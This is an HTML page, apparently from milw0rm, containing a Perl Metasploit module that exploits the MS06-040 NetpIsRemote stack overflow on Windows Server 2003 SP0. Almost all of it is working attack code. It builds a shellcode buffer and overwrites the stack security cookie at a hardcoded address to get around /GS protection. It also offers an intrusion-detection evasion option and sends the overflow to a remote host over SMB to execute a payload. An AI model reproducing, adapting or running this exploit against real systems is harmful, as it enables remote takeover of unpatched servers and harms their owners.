<html><head><title>MS Windows NetpIsRemote() Remote Overflow Exploit (MS06-040) (2k3)</title></head><pre>#########################################################################
# netapi_win2003.pm (MS06-040 Exploit for Windows Server 2003 SP0)
#
# Author: Trirat Puttaraksa (Kira) &lt;trir00t [at] gmail.com&gt;
#
# http://sf-freedom.blogspot.com
# 
# For educational purpose only
#
# Note: This exploit is developed because of my question &quot;Is it exploitable
# on Windows Server 2003 platform ?&quot;. As I know, Windows XP SP2 and Windows
# Server 2003 SP1 is not exploitable because they are compiled with /GS, but
# how about Windows Server 2003 SP0 ? In metasploit netapi_ms06_040.pm there
# is no Windows Server 2003 sp0 target, this means 2003 SP0 is not 
# exploitable ? There is Stack Protection Windows Server 2003, is this the
# reasons why there is no Windows Server 2003 SP0 exploit for MS06-040 ?
#
# I start to modify H D Moore's exploit (netapi_ms06_040.pm - credits to him
# ^-^) and work on it. The problem is the Stack Protection &quot;security cookie 
# checking&quot;. Because wcscpy() method allow me to write to any memory location
# that are marked writable, I decide to write to the location at &quot;security
# cookie&quot; is stored and it works !!! I will describe more implementation details
# in my blog in few days ^-^ 
#
# This exploit tested on Windows Server 2003 SP0 build 3790 and successful 
# exploit 2003 machine in my environment - all patch before MS06-040 
# (KB921883). It's quite reliable but not 100%. There is the possibility that
# the exploit will fail and the target system process crash. Because I have 
# only one testbase system, I couldn't confirm this exploit will work on 
# your environment. However feel free to e-mail to me.
#
# Credits: H D Moore
#########################################################################

package Msf::Exploit::netapi_win2003;
use base &quot;Msf::Exploit&quot;;
use strict;

use Pex::DCERPC;
use Pex::NDR;

my $advanced = {
	'FragSize'    =&gt; [ 256, 'The DCERPC fragment size' ],
	'BindEvasion' =&gt; [ 0,   'IDS Evasion of the bind request' ],
	'DirectSMB'   =&gt; [ 0,   'Use direct SMB (445/tcp)' ],
  };

my $info = {
	'Name'    =&gt; 'MSO6-040 Windows Server 2003 Target',
	'Version' =&gt; '',
	'Authors' =&gt;
	  [
		'Trirat Puttaraksa (Kira) &lt;trir00t [at] gmail.com&gt;',
	  ],

	'Arch' =&gt; ['x86'],
	'OS'   =&gt; [ 'win32', 'win2003' ],
	'Priv' =&gt; 1,

	'AutoOpts' =&gt; { 'EXITFUNC' =&gt; 'thread' },
	
	'UserOpts' =&gt;
	  {
		'RHOST' =&gt; [ 1, 'ADDR', 'The target address' ],

		# SMB connection options
		'SMBUSER' =&gt; [ 0, 'DATA', 'The SMB username to connect with', '' ],
		'SMBPASS' =&gt; [ 0, 'DATA', 'The password for specified SMB username', '' ],
		'SMBDOM'  =&gt; [ 0, 'DATA', 'The domain for specified SMB username', '' ],
	  },

	'Payload' =&gt;
	  {
	  	# Technically we can use more space than this, but by limiting it
		# to 370 bytes we can use the same request for all Windows SPs.
		'Space'    =&gt; 370,
		
		'BadChars' =&gt; &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e&quot;,
		'Keys'     =&gt; ['+ws2ord'],

		# sub esp, 4097 + inc esp makes stack happy
		'Prepend' =&gt; &quot;\x81\xc4\xff\xef\xff\xff\x44&quot;,
	  },

	'Description' =&gt; Pex::Text::Freeform(
		qq{
		This exploit modified from netapi_ms06_040.pm (Metasploit).
		While netapi_ms06_040 of metasploit works on Windows 2000 
		SP0 - SP4 and Windows XP SP0 - SP1, this exploit works on
		Windows Server 2003 SP0.
	  }
	  ),

	'Refs' =&gt;
	  [
		[ 'BID', '19409' ],
		[ 'CVE', '2006-3439' ],
		[ 'MSB', 'MS06-040' ],
	  ],

	'DefaultTarget' =&gt; 0,
	'Targets'       =&gt;
	  [
		[ '(wcscpy) Windows Server 2003 SP0', 612],
	  ],

	'Keys' =&gt; ['srvsvc'],

	'DisclosureDate' =&gt; '',
  };

sub new {
	my ($class) = @_;
	my $self =
	  $class-&gt;SUPER::new( { 'Info' =&gt; $info, 'Advanced' =&gt; $advanced }, @_ );
	return ($self);
}

sub Exploit {
	my ($self)      = @_;
	my $target_host = $self-&gt;GetVar('RHOST');
	my $target_port = $self-&gt;GetVar('RPORT');
	my $target_idx  = $self-&gt;GetVar('TARGET');
	my $shellcode   = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
	my $target_name = '*SMBSERVER';

	my $FragSize = $self-&gt;GetVar('FragSize') || 256;
	my $target   = $self-&gt;Targets-&gt;[$target_idx];

	if (!$self-&gt;InitNops(128)) {
		$self-&gt;PrintLine(&quot;Could not initialize the nop module&quot;);
		return;
	}

	my ( $res, $rpc );

	my $pipe    = '\BROWSER';
	my $uuid    = '4b324fc8-1670-01d3-1278-5a47bf6ee188';
	my $version = '3.0';

	my $handle = Pex::DCERPC::build_handle( $uuid, $version, 'ncacn_np', $target_host, $pipe );

	my $dce = Pex::DCERPC-&gt;new(
		'handle'      =&gt; $handle,
		'username'    =&gt; $self-&gt;GetVar('SMBUSER'),
		'password'    =&gt; $self-&gt;GetVar('SMBPASS'),
		'domain'      =&gt; $self-&gt;GetVar('SMBDOM'),
		'fragsize'    =&gt; $self-&gt;GetVar('FragSize'),
		'bindevasion' =&gt; $self-&gt;GetVar('BindEvasion'),
		'directsmb'   =&gt; $self-&gt;GetVar('DirectSMB'),
	  );

	if ( !$dce ) {
		$self-&gt;PrintLine(&quot;[*] Could not bind to $handle&quot;);
		return;
	}

	my $smb = $dce-&gt;{'_handles'}{$handle}{'connection'};
	
	if (! $smb) {
		$self-&gt;PrintLine(&quot;[*] Could not establish SMB session&quot;);
		return;
	}

	my $stub;

	#
	# Use the wcscpy() method on Windows Server 2003 SP0
	#	
	if ($target-&gt;[0] =~ /2003/) {

		my $path = 	
			$shellcode.

			# Padding
			Pex::Text::AlphaNumText($target-&gt;[1] - length($shellcode)).
			Pex::Text::AlphaNumText(32).
			substr($shellcode, 0, 4).	# cookie
			Pex::Text::AlphaNumText(4).
			# return address == address that store security cookie
			(&quot;\xec\xc1\xc8\x71&quot;) . 
			Pex::Text::AlphaNumText(8).

			(&quot;\xec\xc1\xc8\x71&quot; x 2) .
			Pex::Text::AlphaNumText(36).

			# Terminate
			&quot;\x00\x00&quot;;


		# Package that into a stub
		$stub =
			Pex::NDR::Long(int(rand(0xffffffff))).
			Pex::NDR::UnicodeConformantVaryingString('').
			Pex::NDR::UnicodeConformantVaryingStringPreBuilt($path).
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::UnicodeConformantVaryingString('').
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::Long(0);
	}
	else {
		$self-&gt;PrintLine(&quot;This target is not currently supported&quot;);
		return;
	}


	$self-&gt;PrintLine(&quot;[*] Sending request...&quot;);
	
	# Function 0x1f is not the only way to exploit this :-)
	my @response = $dce-&gt;request( $handle, 0x1f, $stub );
	
	if ( length($dce-&gt;{'response'}-&gt;{'StubData'}) &gt; 0) {
		$self-&gt;PrintLine(&quot;[*] The server rejected it, trying again...&quot;);
		@response = $dce-&gt;request( $handle, 0x1f, $stub );
	}
	
	if ( length($dce-&gt;{'response'}-&gt;{'StubData'}) &gt; 0) {
		$self-&gt;PrintLine(&quot;[*] Exploit Failed&quot;);
	}
	
	if (@response) {
		$self-&gt;PrintLine('[*] RPC server responded with:');
		foreach my $line (@response) {
			$self-&gt;PrintLine( '[*] ' . $line );
		}
	}

	return;
}

1;

# milw0rm.com [2006-09-13]</pre></html>